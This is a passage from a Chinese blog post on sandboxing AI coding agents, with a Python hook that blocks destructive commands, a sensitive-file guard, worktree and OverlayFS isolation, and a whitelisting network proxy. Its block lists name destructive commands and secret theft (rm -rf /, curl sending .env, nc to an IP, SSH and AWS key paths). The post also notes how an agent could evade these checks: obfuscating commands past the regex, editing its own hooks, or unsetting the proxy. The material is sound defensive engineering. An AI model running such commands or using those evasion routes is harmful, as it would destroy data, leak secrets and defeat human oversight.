+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># .claude/hooks/danger-guard.py — 危险命令守卫</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 从 stdin 读 Hook 传入的 tool_input</span>
+</span></span><span class="line"><span class="cl"><span class="n">tool_input</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="n">tool_input</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;command&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 规则集：每一条是 (正则, 风险等级, 说明)</span>
+</span></span><span class="line"><span class="cl"><span class="n">RULES</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># === CRITICAL: 直接拒绝 ===</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;rm\s+-rf\s+/&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止递归删除根目录&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;rm\s+-rf\s+~&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止递归删除家目录&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;rm\s+-rf\s+\$HOME&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止递归删除家目录&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;DROP\s+(TABLE|DATABASE)&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止 DROP TABLE/DATABASE，请用迁移工具&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;TRUNCATE\s+(TABLE\s+)?&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止 TRUNCATE，请用 DELETE + WHERE&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;git\s+push\s+.*(--force|-f)&#34;</span><span class="p">,</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">,</span> <span class="s2">&#34;禁止 git push --force，请用 --force-with-lease&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># === HIGH: 需人工确认 ===</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;curl.*\.env&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span> <span class="s2">&#34;疑似将 .env 文件内容外传&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(nc|netcat)\s+.*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span> <span class="s2">&#34;nc 连接 IP，疑似数据外传&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;sudo\s+&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span> <span class="s2">&#34;提权操作&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;chmod\s+777&#34;</span><span class="p">,</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">,</span> <span class="s2">&#34;过度开放文件权限&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># === MEDIUM: 记录日志但不拦截 ===</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;pip\s+install&#34;</span><span class="p">,</span> <span class="s2">&#34;MEDIUM&#34;</span><span class="p">,</span> <span class="s2">&#34;安装新包——检查是否为已知包&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;npm\s+install\s+-g&#34;</span><span class="p">,</span> <span class="s2">&#34;MEDIUM&#34;</span><span class="p">,</span> <span class="s2">&#34;全局安装 npm 包&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">blocked</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">level</span><span class="p">,</span> <span class="n">reason</span> <span class="ow">in</span> <span class="n">RULES</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">level</span> <span class="o">==</span> <span class="s2">&#34;CRITICAL&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;decision&#34;</span><span class="p">:</span> <span class="s2">&#34;block&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;reason&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">level</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">reason</span><span class="si">}</span><span class="se">\n</span><span class="s2">匹配模式: </span><span class="si">{</span><span class="n">pattern</span><span class="si">}</span><span class="se">\n</span><span class="s2">命令: </span><span class="si">{</span><span class="n">command</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">blocked</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">level</span> <span class="o">==</span> <span class="s2">&#34;HIGH&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;decision&#34;</span><span class="p">:</span> <span class="s2">&#34;ask&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;reason&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="n">level</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">reason</span><span class="si">}</span><span class="se">\n</span><span class="s2">命令: </span><span class="si">{</span><span class="n">command</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">是否继续？&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">blocked</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">level</span> <span class="o">==</span> <span class="s2">&#34;MEDIUM&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 仅记录到审计日志，不拦截</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/tmp/agent-audit.log&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[MEDIUM] </span><span class="si">{</span><span class="n">reason</span><span class="si">}</span><span class="s2"> | cmd: </span><span class="si">{</span><span class="n">command</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">blocked</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;decision&#34;</span><span class="p">:</span> <span class="s2">&#34;allow&#34;</span><span class="p">}))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这层的好处是零基础设施——不需要 Docker，不需要额外进程，就是一段脚本。缺点也很明显：<strong>基于正则的拦截可以被绕过。</strong> Agent 如果把 <code>rm -rf /</code> 写成 <code>rm -rf /./</code> 或者包在 <code>sh -c</code> 里，规则就漏过去了。</p>
+<p>所以这层只拦意外和低级错误，不防对抗。下一层开始动真格。</p>
+<blockquote>
+<p><strong>工程纪律：Hook 和权限配置不能放在 Agent 够得着的地方。</strong> 被关的人不能拿着钥匙。项目目录里的 hooks 配置，Agent 自己就能改——改完它就自由了。安全相关的 Hook 一律放全局目录（<code>~/.claude/hooks/</code>）、设只读，配置变更进 git 审计。</p>
+</blockquote>
+<hr>
+<h2 id="4-第二层文件系统隔离让-agent-只碰到该碰的文件">4. 第二层：文件系统隔离——让 Agent 只碰到该碰的文件</h2>
+<h3 id="41-核心思路">4.1 核心思路</h3>
+<p>Agent 不需要访问你的全部文件系统。它需要的是：</p>
+<ul>
+<li><strong>项目代码</strong>（读写）——正在改的那个 repo</li>
+<li><strong>临时目录</strong>（读写）——构建产物、测试输出</li>
+<li><strong>包缓存</strong>（只读）——<code>node_modules</code>、<code>.venv</code>、pip cache</li>
+<li><strong>系统工具</strong>（只执行，不读写）——<code>/usr/bin/git</code>、<code>/usr/bin/python</code></li>
+</ul>
+<p>除此之外，下面这些东西 Agent <strong>绝对不该碰</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>不该碰的</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>~/.ssh/</code></td>
+<td>私钥泄露 = 服务器全沦陷</td>
+</tr>
+<tr>
+<td><code>~/.aws/</code>、<code>~/.config/gcloud/</code></td>
+<td>云服务凭证</td>
+</tr>
+<tr>
+<td><code>.env</code>、<code>.env.local</code>、<code>secrets.*</code></td>
+<td>数据库密码、API key</td>
+</tr>
+<tr>
+<td><code>~/.claude/</code>（部分文件）</td>
+<td>你的全局配置和记忆</td>
+</tr>
+<tr>
+<td><code>/etc/</code></td>
+<td>系统配置</td>
+</tr>
+<tr>
+<td>其他项目的 repo</td>
+<td>误操作波及</td>
+</tr>
+</tbody>
+</table>
+<p>文件系统隔离从轻到重有四层做法。不是四选一，是看你的威胁模型到哪层：</p>
+<ul>
+<li><strong>工作目录约束 + Hook 拦截。</strong> 最轻量。Agent 默认只在项目目录活动，PreToolUse Hook 禁掉敏感路径（<code>.env</code>、<code>~/.ssh</code>、<code>~/.aws</code>）。成本几乎为零，但 Hook 拦不住就全裸——适合日常开发基线。</li>
+<li><strong>OS 级沙箱。</strong> 不换工作方式，直接用操作系统自带的隔离机制：macOS 的 Seatbelt（<code>sandbox-exec</code>）、Linux 的 bubblewrap / seccomp / Landlock。进程级隔离，开销比容器小得多。Anthropic 后来官方放出的 sandbox-runtime 走的就是这条路——说明他们也承认，光劝是不够的。</li>
+<li><strong>容器。</strong> Docker 或 devcontainer，只把项目目录挂进去，HOME 是临时的，云凭证、SSH 密钥、浏览器 cookie 统统不在 Agent 的视野里。</li>
+<li><strong>microVM。</strong> Firecracker、gVisor、Kata 这一档，每个 Agent 一个轻量虚拟机，内核都不共享。e2b 这类 Agent 运行时用的就是 Firecracker。重量、启动慢，但跑来路不明的代码时，这是唯一让人睡得着的选项。</li>
+</ul>
+<p>下面展开两种实用的工程方案：Worktree（轻量隔离，秒级创建）和 OverlayFS（写时复制，修改不进原项目）。</p>
+<h3 id="42-方案-agit-worktree轻量">4.2 方案 A：Git Worktree（轻量）</h3>
+<p>最轻量的隔离：Agent 在独立 worktree 里工作，改的是副本，出了问题不影响原 repo。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建隔离 worktree</span>
+</span></span><span class="line"><span class="cl">git worktree add /tmp/agent-sandbox-<span class="k">$(</span>date +%s<span class="k">)</span> main
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /tmp/agent-sandbox-*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Claude Code 的 <code>EnterWorktree</code> 工具就是这个模式。Worktree 的好处是文件系统完全隔离——Agent 在 worktree 里 <code>rm -rf *</code> 也删不到原项目。加上敏感文件保护：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// .claude/settings.local.json — 敏感文件写保护
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hooks&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;PreToolUse&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;matcher&#34;</span><span class="p">:</span> <span class="s2">&#34;Write|Edit&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;hooks&#34;</span><span class="p">:</span> <span class="p">[{</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;command&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&#34;command&#34;</span><span class="p">:</span> <span class="s2">&#34;python3 .claude/hooks/sensitive-file-guard.py&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># .claude/hooks/sensitive-file-guard.py — 敏感文件保护</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tool_input</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_path</span> <span class="o">=</span> <span class="n">tool_input</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;file_path&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SENSITIVE_PATTERNS</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;.env&#34;</span><span class="p">,</span> <span class="s2">&#34;.env.local&#34;</span><span class="p">,</span> <span class="s2">&#34;.env.production&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;secrets.yaml&#34;</span><span class="p">,</span> <span class="s2">&#34;secrets.yml&#34;</span><span class="p">,</span> <span class="s2">&#34;secret.yaml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;credentials.json&#34;</span><span class="p">,</span> <span class="s2">&#34;service-account.json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id_rsa&#34;</span><span class="p">,</span> <span class="s2">&#34;id_ed25519&#34;</span><span class="p">,</span> <span class="s2">&#34;id_ecdsa&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;.aws/credentials&#34;</span><span class="p">,</span> <span class="s2">&#34;.aws/config&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;.ssh/&#34;</span><span class="p">,</span> <span class="s2">&#34;.gnupg/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">abs_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">SENSITIVE_PATTERNS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">abs_path</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;decision&#34;</span><span class="p">:</span> <span class="s2">&#34;block&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;reason&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;禁止修改敏感文件: </span><span class="si">{</span><span class="n">abs_path</span><span class="si">}</span><span class="se">\n</span><span class="s2">匹配模式: </span><span class="si">{</span><span class="n">pattern</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;decision&#34;</span><span class="p">:</span> <span class="s2">&#34;allow&#34;</span><span class="p">}))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="43-方案-b只读挂载--overlayfs中级">4.3 方案 B：只读挂载 + OverlayFS（中级）</h3>
+<p>对更严格的需求，把项目目录只读挂载，上面叠一层 OverlayFS 让 Agent 写入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 只读挂载原项目</span>
+</span></span><span class="line"><span class="cl">mount --bind /home/user/project /mnt/ro-project
+</span></span><span class="line"><span class="cl">mount -o remount,ro /mnt/ro-project
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># OverlayFS：Agent 的写入全到 upperdir，不影响原项目</span>
+</span></span><span class="line"><span class="cl">mount -t overlay overlay <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -o <span class="nv">lowerdir</span><span class="o">=</span>/mnt/ro-project,upperdir<span class="o">=</span>/tmp/agent-upper,workdir<span class="o">=</span>/tmp/agent-work <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  /mnt/agent-workspace
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Agent 看到的是完整的项目目录，但所有修改都进了 <code>/tmp/agent-upper</code>。确认没问题后，手动合并回去。有问题就直接删 <code>/tmp/agent-upper</code>。</p>
+<p>这方案适合 CI 场景——Agent 跑完，diff 一下 upperdir，人工确认后再合入。</p>
+<p>一个自检问题：<strong>Agent 能看到的文件系统，和你能看到的文件系统，差集是什么？</strong> 差集里每一样东西——<code>.env</code>、SSH 密钥、云凭证、Cookie——就是你的攻击面清单。隔离的颗粒度，就是把这张清单一项项划掉的过程。</p>
+<hr>
+<h2 id="5-第三层网络熔断agent-发不出不该发的请求">5. 第三层：网络熔断——Agent 发不出不该发的请求</h2>
+<h3 id="51-攻击面">5.1 攻击面</h3>
+<p>Agent 的 Bash 工具能执行 <code>curl</code>、<code>wget</code>、<code>nc</code>、<code>python -c &quot;import requests&quot;</code>。一不留神，你的环境变量就通过 HTTP 请求发出去了。</p>
+<p>这层的目标是：<strong>Agent 可以访问它需要的网络资源，但不能访问它不需要的。</strong> 白名单模式比黑名单模式安全得多。</p>
+<p>工程上三种做法，从轻到重：</p>
+<ul>
+<li><strong>环境变量级。</strong> 容器或沙箱里设 <code>HTTPS_PROXY</code> 指向一个你控制的代理，代理按域名放行。最灵活，也是最容易被绕的——Agent 可以 <code>unset</code> 它。下面 §5.2 给参考实现。</li>
+<li><strong>容器网络级。</strong> <code>--network none</code> 彻底断网，或者自建 bridge 配合 iptables 只放行白名单域名。这才是&quot;默认拒绝&quot;的正确落地。§6 的 Docker 沙箱配的就是这种。</li>
+<li><strong>服务网格级。</strong> 多 Agent 场景下，每个 Agent 容器的出站流量全部接管，按身份放行。生产环境玩法，个人用不到，但思路一样。</li>
+</ul>
+<h3 id="52-方案socks5-代理--白名单">5.2 方案：SOCKS5 代理 + 白名单</h3>
+<p>起一个本地代理，所有 Agent 的网络流量走这个代理，代理只放行白名单域名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># agent-network-proxy.py — Agent 专用网络代理</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动: python3 agent-network-proxy.py --port 9999</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 配置: export HTTP_PROXY=socks5://127.0.0.1:9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 白名单：Agent 只能访问这些域名</span>
+</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_DOMAINS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pypi.org&#34;</span><span class="p">,</span> <span class="s2">&#34;files.pythonhosted.org&#34;</span><span class="p">,</span>       <span class="c1"># pip</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;registry.npmjs.org&#34;</span><span class="p">,</span>                        <span class="c1"># npm</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;github.com&#34;</span><span class="p">,</span> <span class="s2">&#34;api.github.com&#34;</span><span class="p">,</span>             <span class="c1"># git</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;raw.githubusercontent.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;docs.python.org&#34;</span><span class="p">,</span> <span class="s2">&#34;developer.mozilla.org&#34;</span><span class="p">,</span> <span class="c1"># 文档</span>
